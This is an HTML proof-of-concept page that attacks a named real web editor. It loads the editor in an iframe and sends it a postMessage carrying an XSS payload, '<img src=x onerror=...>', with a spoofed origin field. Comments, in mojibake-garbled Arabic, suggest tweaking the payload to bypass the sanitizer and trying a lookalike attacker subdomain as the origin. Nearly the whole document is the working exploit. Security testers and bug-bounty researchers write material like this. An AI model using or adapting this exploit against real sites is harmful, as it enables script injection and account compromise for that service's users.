<!DOCTYPE html>
<html>
<head>
  <title>XSS PoC - Toloka Template Builder</title>
</head>
<body>
  <h2>ðŸš¨ Ø§Ø®ØªØ¨Ø§Ø± XSS Ø¹Ø¨Ø± postMessage</h2>
  <iframe id="toloka_iframe"
    src="https://tb.toloka.dev/editor"
    width="1200"
    height="800"
    style="border: 2px solid red;"></iframe>

  <script>
    window.onload = function () {
      const iframe = document.getElementById('toloka_iframe');

      // Ø§Ù†ØªØ¸Ø± ØªØ­Ù…ÙŠÙ„ iframe
      iframe.onload = function () {
        const targetOrigin = 'https://tb.toloka.dev';

        // Ø­Ù…ÙˆÙ„Ø© XSS - ØªØ¹Ø¯ÙŠÙ„Ù‡Ø§ Ù…Ù…ÙƒÙ† Ø­Ø³Ø¨ bypass sanitizer
        const payload = '<img src=x onerror=alert("ðŸ”¥ XSS via postMessage")>';

        // Ø¥Ù†Ø´Ø§Ø¡ Ø±Ø³Ø§Ù„Ø© ØªØ´Ø¨Ù‡ Ø§Ø³ØªØ¬Ø§Ø¨Ø© fetch
        const message = {
          originalEvent: {
            origin: targetOrigin // Ø£Ùˆ Ù…Ø­Ø§ÙˆÙ„Ø© bypass Ù…Ø«Ù„ attacker.toloka.dev
          },
          data: payload
        };

        // Ø¥Ø±Ø³Ø§Ù„ postMessage Ù…Ø¨Ø§Ø´Ø±Ø© Ø¨Ø¹Ø¯ Ø§Ù„ØªØ­Ù…ÙŠÙ„
        iframe.contentWindow.postMessage(message, targetOrigin);
      };
    };
  </script>
</body>
</html>


